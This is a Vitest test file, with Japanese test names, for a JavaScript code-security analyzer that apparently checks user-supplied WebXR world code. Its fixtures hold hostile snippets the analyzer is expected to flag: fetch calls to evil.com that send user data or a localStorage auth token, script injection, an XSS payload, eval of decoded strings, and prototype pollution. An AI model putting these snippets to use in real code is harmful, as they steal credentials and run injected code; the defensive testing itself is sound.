import { describe, it, expect } from 'vitest'
import { analyzeCodeSecurity } from '../src/analyzer.js'
import { adjustViolationSeverity, determineFileContext, isUnknownFile } from '../src/utils/file-context.js'
import { matchesKnownLibraryPattern } from '../src/utils/helpers.js'
import { CodeSecurityService } from '../src/index.js'
import type { FileContext } from '../src/types.js'

describe('CodeSecurityService - analyzer', () => {
  describe('正常系', () => {
    it('正常なコードはviolationなし', () => {
      const code = `
        import { useFrame } from '@react-three/fiber'
        import { RigidBody } from '@react-three/rapier'

        export function createWorld() {
          const mesh = { position: [0, 0, 0] }
          return mesh
        }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasEval).toBe(false)
      expect(signals.hasDynamicCodeExecution).toBe(false)
      expect(signals.hasNetworkAPI).toBe(false)
      expect(signals.hasNavigatorAccess).toBe(false)
      expect(signals.hasStorageAccess).toBe(false)
      expect(signals.hasObfuscatedCode).toBe(false)
      expect(signals.detectedViolations).toHaveLength(0)
    })
  })

  describe('異常系 - eval検出', () => {
    it('eval()の使用を検出', () => {
      const code = `
        const code = "alert('XSS')"
        eval(code)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasEval).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-eval',
            severity: 'critical',
            message: 'eval()の使用は禁止されています',
          }),
        ])
      )
    })
  })

  describe('異常系 - setTimeout/setInterval 文字列引数検出', () => {
    it('setTimeout に文字列を渡すことを検出', () => {
      const code = `
        setTimeout("alert('XSS')", 1000)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasDynamicCodeExecution).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-string-timeout',
            severity: 'critical',
          }),
        ])
      )
    })
  })

  describe('異常系 - ネットワークAPI検出', () => {
    it('fetch()の使用を検出', () => {
      const code = `
        fetch('https://evil.com/steal', {
          method: 'POST',
          body: JSON.stringify(userData)
        })
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasNetworkAPI).toBe(true)
      expect(signals.hasNetworkWithoutPermission).toBe(true)
      expect(signals.referencedDomains).toContain('evil.com')
    })

    it('権限付きfetch()は許可', () => {
      const code = `
        fetch('https://cdn.jsdelivr.net/data.json')
      `

      const signals = analyzeCodeSecurity(code, {
        network: {
          allowedDomains: ['cdn.jsdelivr.net']
        }
      })

      expect(signals.hasNetworkAPI).toBe(true)
      expect(signals.hasNetworkWithoutPermission).toBe(false)
    })
  })

  describe('異常系 - ストレージアクセス検出', () => {
    it('localStorageアクセスを検出', () => {
      const code = `
        const token = localStorage.getItem('auth_token')
        fetch('https://evil.com/steal?token=' + token)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasStorageAccess).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-storage-access',
            severity: 'critical',
          }),
        ])
      )
    })

    it('cookieアクセスを検出', () => {
      const code = `
        const cookies = document.cookie
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasStorageAccess).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-cookie-access',
            severity: 'critical',
          }),
        ])
      )
    })

    it("addEventListener('storage', ...)を検出", () => {
      const code = `
        window.addEventListener('storage', (e) => {
          if (e.key === 'xrift-refresh-token') {
            // トークンを傍受
          }
        })
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasStorageAccess).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-storage-event',
            severity: 'critical',
          }),
        ])
      )
    })

    it('onstorageへの代入を検出', () => {
      const code = `
        window.onstorage = function(e) {
          console.log(e.key, e.newValue)
        }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasStorageAccess).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-storage-event',
            severity: 'critical',
          }),
        ])
      )
    })
  })

  describe('異常系 - navigator検出', () => {
    it('navigator.userAgentアクセスを検出', () => {
      const code = `
        const fingerprint = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
        }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasNavigatorAccess).toBe(true)
      expect(signals.detectedViolations.length).toBeGreaterThan(0)
    })
  })

  describe('異常系 - DOM操作検出', () => {
    it('innerHTML書き込みを検出', () => {
      const code = `
        const userInput = "<img src=x onerror=alert('XSS')>"
        document.body.innerHTML = userInput
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasDangerousDOMManipulation).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-dangerous-dom',
            severity: 'critical',
          }),
        ])
      )
    })

    it('document.createElement("script")を検出', () => {
      const code = `
        const script = document.createElement('script')
        script.src = 'https://evil.com/malicious.js'
        document.body.appendChild(script)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasDangerousDOMManipulation).toBe(true)
    })
  })

  describe('異常系 - 難読化検出', () => {
    it('atob()使用を検出', () => {
      const code = `
        const decoded = atob('ZXZpbCBjb2Rl')
        eval(decoded)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasObfuscatedCode).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-obfuscation',
            severity: 'critical',
          }),
        ])
      )
    })

    it('String.fromCharCode()使用を検出', () => {
      const code = `
        const str = String.fromCharCode(101, 118, 97, 108)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasObfuscatedCode).toBe(true)
    })
  })

  describe('異常系 - グローバル変数改ざん', () => {
    it('window.fetchの上書きを検出', () => {
      const code = `
        const originalFetch = window.fetch
        window.fetch = function(...args) {
          console.log('Intercepted:', args)
          return originalFetch(...args)
        }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-global-override',
            severity: 'critical',
          }),
        ])
      )
    })

    it('Object.prototypeの汚染を検出', () => {
      const code = `
        Object.prototype.isAdmin = true
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-prototype-pollution',
            severity: 'critical',
          }),
        ])
      )
    })
  })

  describe('インポート解析', () => {
    it('許可パッケージのインポートを記録', () => {
      const code = `
        import React from 'react'
        import { Canvas } from '@react-three/fiber'
        import * as THREE from 'three'
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.importedPackages).toEqual(['react', '@react-three/fiber', 'three'])
      expect(signals.detectedViolations).toHaveLength(0)
    })

    it('外部URLインポートを検出', () => {
      const code = `
        import malicious from 'https://evil.com/hack.js'
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-external-import',
            severity: 'critical',
          }),
        ])
      )
    })
  })

  // --- 誤検知改善テスト (Issue #9, #10, #11, #12, #13) ---

  describe('Issue #9 - 自クラスの .prototype 定義は誤検知しない', () => {
    it('MyClass.prototype.method = ... は検出しない', () => {
      const code = `
        function MyClass() {}
        MyClass.prototype.render = function() { return null }
        MyClass.prototype.update = function(dt) { this.time += dt }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(false)
      expect(signals.detectedViolations.filter(v => v.rule === 'no-prototype-pollution')).toHaveLength(0)
    })

    it('Object.prototype の汚染は引き続き検出する', () => {
      const code = `
        Object.prototype.isAdmin = true
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-prototype-pollution',
            severity: 'critical',
          }),
        ])
      )
    })

    it('Array.prototype の汚染も検出する', () => {
      const code = `
        Array.prototype.last = function() { return this[this.length - 1] }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-prototype-pollution',
            severity: 'critical',
          }),
        ])
      )
    })
  })

  describe('Issue #10 - __REACT_DEVTOOLS_GLOBAL_HOOK__ は誤検知しない', () => {
    it('React DevTools のグローバル変数は疑わしい変数名として検出しない', () => {
      const code = `
        const hook = typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined'
          ? __REACT_DEVTOOLS_GLOBAL_HOOK__
          : null
      `

      const signals = analyzeCodeSecurity(code)

      const obfuscationViolations = signals.detectedViolations.filter(v => v.rule === 'no-obfuscation')
      const hasSuspiciousVarViolation = obfuscationViolations.some(v =>
        v.message.includes('疑わしい変数名')
      )
      expect(hasSuspiciousVarViolation).toBe(false)
    })

    it('webpack のグローバル変数も疑わしい変数名として検出しない', () => {
      const code = `
        const mod = __webpack_require__(123)
        __webpack_exports__["default"] = mod
      `

      const signals = analyzeCodeSecurity(code)

      const hasSuspiciousVarViolation = signals.detectedViolations.some(v =>
        v.rule === 'no-obfuscation' && v.message.includes('疑わしい変数名')
      )
      expect(hasSuspiciousVarViolation).toBe(false)
    })
  })

  describe('Issue #13 - WASM ファイルの fetch は誤検知しない', () => {
    it('.wasm ファイルの fetch はネットワーク違反として検出しない', () => {
      const code = `
        const response = fetch('rapier_wasm_bg.wasm')
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasNetworkAPI).toBe(false)
      expect(signals.hasNetworkWithoutPermission).toBe(false)
      expect(signals.detectedViolations.filter(v => v.rule === 'no-network-without-permission')).toHaveLength(0)
    })

    it('通常の fetch は引き続き検出する', () => {
      const code = `
        fetch('https://evil.com/data')
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasNetworkAPI).toBe(true)
    })
  })
})

describe('adjustViolationSeverity - ファイルコンテキスト別の抑制', () => {
  describe('Issue #11 - Vite preload-helper の document.head 誤検知', () => {
    it('preload-helper ファイルの no-dangerous-dom は完全抑制される', () => {
      const context: FileContext = {
        filePath: 'preload-helper-abc123.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: true,
      }

      const result = adjustViolationSeverity('no-dangerous-dom', 'critical', context)
      expect(result).toBeNull()
    })

    it('preload-helper でも no-eval は抑制されない', () => {
      const context: FileContext = {
        filePath: 'preload-helper-abc123.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: true,
      }

      const result = adjustViolationSeverity('no-eval', 'critical', context)
      expect(result).toBe('critical')
    })
  })

  describe('Issue #12 - remoteEntry.js の window/globalThis 警告', () => {
    it('remoteEntry.js の no-global-override は完全抑制される', () => {
      const context: FileContext = {
        filePath: 'remoteEntry.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: false,
      }

      const result = adjustViolationSeverity('no-global-override', 'critical', context)
      expect(result).toBeNull()
    })

    it('remoteEntry.js の no-dangerous-dom は完全抑制される', () => {
      const context: FileContext = {
        filePath: 'remoteEntry.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: false,
      }

      const result = adjustViolationSeverity('no-dangerous-dom', 'critical', context)
      expect(result).toBeNull()
    })

    it('remoteEntry.js でも no-eval は抑制されない', () => {
      const context: FileContext = {
        filePath: 'remoteEntry.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: false,
      }

      const result = adjustViolationSeverity('no-eval', 'critical', context)
      expect(result).toBe('critical')
    })
  })

  describe('バンドル依存ファイルの段階的抑制', () => {
    const bundledContext: FileContext = {
      filePath: 'vision_bundle-DJzU6HDp.js',
      isUserCode: false,
      isSharedLibrary: false,
      isBundledDependency: true,
    }

    it.each([
      'no-obfuscation',
      'no-navigator-access',
      'no-prototype-pollution',
      'no-global-override',
    ])('低リスク違反 %s は完全抑制される', (rule) => {
      const result = adjustViolationSeverity(rule, 'critical', bundledContext)
      expect(result).toBeNull()
    })

    it.each([
      'no-network-without-permission',
      'no-dangerous-dom',
    ])('高リスク違反 %s は抑制されない', (rule) => {
      const result = adjustViolationSeverity(rule, 'critical', bundledContext)
      expect(result).toBe('critical')
    })

    it.each([
      'no-eval',
      'no-storage-access',
      'no-storage-event',
    ])('%s は critical のまま残る', (rule) => {
      const result = adjustViolationSeverity(rule, 'critical', bundledContext)
      expect(result).toBe('critical')
    })

    it('ユーザーコードでは技術的違反も抑制されない', () => {
      const userContext: FileContext = {
        filePath: '__federation_expose_World-abc123.js',
        isUserCode: true,
        isSharedLibrary: false,
        isBundledDependency: false,
      }

      const result = adjustViolationSeverity('no-obfuscation', 'critical', userContext)
      expect(result).toBe('critical')
    })
  })

  describe('ホワイトリスト方式 - 既知ライブラリパターン', () => {
    it.each([
      'three-webgl.js',
      'three.module.js',
      'draco_decoder.js',
      'basis_transcoder.js',
      'rapier_wasm.js',
      'cannon-es.js',
      'ammo-worker.js',
      'hls.min.js',
      'mediapipe_tasks.js',
      'vision_bundle-DJzU6HDp.js',
      'tfjs_backend.js',
      'GoogleTilesInner-7LW4SlWm.js',
      'cesium_workers.js',
      'potpack_module.js',
      '__vite-browser-external.js',
    ])('既知ライブラリ %s は matchesKnownLibraryPattern に一致する', (fileName) => {
      expect(matchesKnownLibraryPattern(fileName)).toBe(true)
    })

    it.each([
      'evil.js',
      'malware.js',
      'keylogger.js',
      'custom-script.js',
      'app.js',
    ])('未知ファイル %s は matchesKnownLibraryPattern に一致しない', (fileName) => {
      expect(matchesKnownLibraryPattern(fileName)).toBe(false)
    })
  })

  describe('determineFileContext - ホワイトリスト判定', () => {
    it('既知ライブラリパターンに一致するファイルは isBundledDependency: true', () => {
      const context = determineFileContext('three-webgl.js')
      expect(context.isBundledDependency).toBe(true)
    })

    it('未知のファイル名は isBundledDependency: false', () => {
      const context = determineFileContext('evil.js')
      expect(context.isBundledDependency).toBe(false)
      expect(context.isUserCode).toBe(false)
      expect(context.isSharedLibrary).toBe(false)
    })

    it('remoteEntry.js は引き続き isBundledDependency: false', () => {
      const context = determineFileContext('remoteEntry.js')
      expect(context.isBundledDependency).toBe(false)
    })

    it('ユーザーコードは引き続き正しく判定される', () => {
      const context = determineFileContext('__federation_expose_World-abc123.js')
      expect(context.isUserCode).toBe(true)
      expect(context.isBundledDependency).toBe(false)
    })
  })

  describe('isUnknownFile - 未知ファイル判定', () => {
    it('どのカテゴリにも属さないファイルは未知と判定される', () => {
      const context: FileContext = {
        filePath: 'GoogleTilesInner-abc123.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: false,
      }
      expect(isUnknownFile(context)).toBe(true)
    })

    it('ユーザーコードは未知と判定されない', () => {
      const context: FileContext = {
        filePath: '__federation_expose_World-abc123.js',
        isUserCode: true,
        isSharedLibrary: false,
        isBundledDependency: false,
      }
      expect(isUnknownFile(context)).toBe(false)
    })

    it('共有ライブラリは未知と判定されない', () => {
      const context: FileContext = {
        filePath: '__federation_shared_react.js',
        isUserCode: false,
        isSharedLibrary: true,
        isBundledDependency: false,
      }
      expect(isUnknownFile(context)).toBe(false)
    })

    it('バンドル依存は未知と判定されない', () => {
      const context: FileContext = {
        filePath: 'three-webgl.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: true,
      }
      expect(isUnknownFile(context)).toBe(false)
    })

    it('remoteEntry.js は未知と判定されない', () => {
      const context: FileContext = {
        filePath: 'remoteEntry.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: false,
      }
      expect(isUnknownFile(context)).toBe(false)
    })

    it('__federation_fn_import は未知と判定されない', () => {
      const context: FileContext = {
        filePath: '__federation_fn_import-abc123.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: false,
      }
      expect(isUnknownFile(context)).toBe(false)
    })

    it('preload-helper は未知と判定されない', () => {
      const context: FileContext = {
        filePath: 'preload-helper-abc123.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: false,
      }
      expect(isUnknownFile(context)).toBe(false)
    })
  })

  describe('攻撃シナリオ防止 - 未知ファイルの違反が抑制されない', () => {
    it('evil.js のような未知ファイルでは全違反が抑制されない', () => {
      const context = determineFileContext('evil.js')

      // isBundledDependency: false なので抑制ロジックに入らない
      const rules = [
        'no-obfuscation',
        'no-dangerous-dom',
        'no-navigator-access',
        'no-prototype-pollution',
        'no-global-override',
        'no-network-without-permission',
        'no-eval',
        'no-storage-access',
        'no-storage-event',
      ]

      for (const rule of rules) {
        const result = adjustViolationSeverity(rule, 'critical', context)
        expect(result).toBe('critical')
      }
    })

    it('攻撃者がランダムなファイル名を使ってもセキュリティチェックを回避できない', () => {
      const maliciousFileNames = [
        'payload.js',
        'backdoor.js',
        'inject.js',
        'c2-client.js',
        'data-exfil.js',
      ]

      for (const fileName of maliciousFileNames) {
        const context = determineFileContext(fileName)
        expect(context.isBundledDependency).toBe(false)

        // 高リスク違反が全て検出される
        expect(adjustViolationSeverity('no-network-without-permission', 'critical', context)).toBe('critical')
        expect(adjustViolationSeverity('no-dangerous-dom', 'critical', context)).toBe('critical')
        expect(adjustViolationSeverity('no-eval', 'critical', context)).toBe('critical')
      }
    })
  })
})

describe('CodeSecurityService - notes ガイダンス', () => {
  const service = new CodeSecurityService()

  it('未知ファイル + 違反ありの場合、notes にガイダンスが含まれる', () => {
    const result = service.validate({
      code: `eval("malicious")`,
      packageJson: { dependencies: {} },
      fileContext: {
        filePath: 'GoogleTilesInner-abc123.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: false,
      },
    })

    expect(result.notes).toBeDefined()
    expect(result.notes).toHaveLength(1)
    expect(result.notes![0]).toContain('GoogleTilesInner-abc123.js')
    expect(result.notes![0]).toContain('既知のライブラリパターンに一致しません')
    expect(result.notes![0]).toContain('https://github.com/WebXR-JP/xrift-code-security/issues')
  })

  it('既知ライブラリの場合、notes は含まれない', () => {
    const result = service.validate({
      code: `eval("something")`,
      packageJson: { dependencies: {} },
      fileContext: {
        filePath: 'three-webgl.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: true,
      },
    })

    expect(result.notes).toBeUndefined()
  })

  it('ユーザーコードの場合、notes は含まれない', () => {
    const result = service.validate({
      code: `eval("something")`,
      packageJson: { dependencies: {} },
      fileContext: {
        filePath: '__federation_expose_World-abc123.js',
        isUserCode: true,
        isSharedLibrary: false,
        isBundledDependency: false,
      },
    })

    expect(result.notes).toBeUndefined()
  })

  it('未知ファイル + 違反なしの場合、notes は含まれない', () => {
    const result = service.validate({
      code: `const x = 1 + 2`,
      packageJson: { dependencies: {} },
      fileContext: {
        filePath: 'GoogleTilesInner-abc123.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: false,
      },
    })

    expect(result.notes).toBeUndefined()
  })
})
